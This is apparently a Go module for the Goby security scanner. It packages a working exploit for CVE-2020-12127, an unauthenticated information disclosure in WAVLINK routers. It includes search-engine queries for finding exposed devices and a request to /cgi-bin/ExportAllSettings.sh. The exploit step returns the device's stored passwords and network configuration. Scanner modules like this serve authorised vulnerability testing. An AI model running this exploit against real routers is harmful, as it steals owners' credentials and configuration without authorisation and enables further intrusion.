package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Multiple WAVLINK routers have sensitive information disclosure vulnerabilities",
    "Description": "<p>WAVLINK Wavlink is a router of China Ruiyin Technology (WAVLINK) company. A hardware device that connects two or more networks and acts as a gateway between the networks.</p><p>There is an information disclosure vulnerability in WAVLINK. The vulnerability stems from errors in the configuration of network systems or products during operation. An unauthorized attacker could exploit the vulnerability to obtain sensitive information about the affected components.</p>",
    "Product": "WAVLINK-Router",
    "Homepage": "https://www.wavlink.com",
    "DisclosureDate": "2020-10-02",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "body=\"/cgi-bin/login.cgi\" && body=\"#7d7d7da6\"",
    "GobyQuery": "body=\"/cgi-bin/login.cgi\" && body=\"#7d7d7da6\"",
    "Level": "2",
    "Impact": "<p>There is an information disclosure vulnerability in WAVLINK. Attackers can read sensitive information such as system passwords and network configurations by constructing special URL addresses.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.wavlink.com/en_us/index.html\">https://www.wavlink.com/en_us/index.html</a></p>",
    "References": [
        "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12127"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/ExportAllSettings.sh",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "wanConnectionMode",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/ExportAllSettings.sh",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2020-12127"
    ],
    "CNNVD": [
        "CNNVD-202010-055"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WAVLINK 多款路由器存在敏感信息泄露漏洞",
            "Product": "WAVLINK-Router",
            "Description": "<p>WAVLINK wavlink是中国睿因科技（WAVLINK）公司的一款路由器。连接两个或多个网络的硬件设备，在网络间起网关的作用。</p><p>WAVLINK存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。</p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a href=\"https://www.wavlink.com/en_us/index.html\" rel=\"nofollow\">https://www.wavlink.com/en_us/index.html</a></p>",
            "Impact": "<p>WAVLINK存在信息泄露漏洞。攻击者通过构造特殊URL地址，读取系统密码、网络配置等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Multiple WAVLINK routers have sensitive information disclosure vulnerabilities",
            "Product": "WAVLINK-Router",
            "Description": "<p>WAVLINK Wavlink is a router of China Ruiyin Technology (WAVLINK) company. A hardware device that connects two or more networks and acts as a gateway between the networks.</p><p>There is an information disclosure vulnerability in WAVLINK. The vulnerability stems from errors in the configuration of network systems or products during operation. An unauthorized attacker could exploit the vulnerability to obtain sensitive information about the affected components.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.wavlink.com/en_us/index.html\" rel=\"nofollow\">https://www.wavlink.com/en_us/index.html</a></p>",
            "Impact": "<p>There is an information disclosure vulnerability in WAVLINK. Attackers can read sensitive information such as system passwords and network configurations by constructing special URL addresses.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}